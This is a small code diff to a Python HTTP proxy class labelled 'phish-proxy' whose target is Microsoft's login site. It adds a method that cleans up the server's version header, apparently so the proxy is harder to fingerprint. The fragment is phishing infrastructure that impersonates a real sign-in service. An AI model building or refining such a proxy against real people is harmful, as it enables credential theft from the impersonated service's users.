@@ -57,6 +57,9 @@ class ProxyHandler(BaseHTTPRequestHandler):
     server_version = 'phish-proxy/1'
     sys_version = ''
 
+    def version_string(self):
+        return self.server_version  # CS74-N2: 消尾随空格(gateway 先例)
+
     # Class-level config (set by serve())
     target_base = 'https://login.microsoft.com'
 
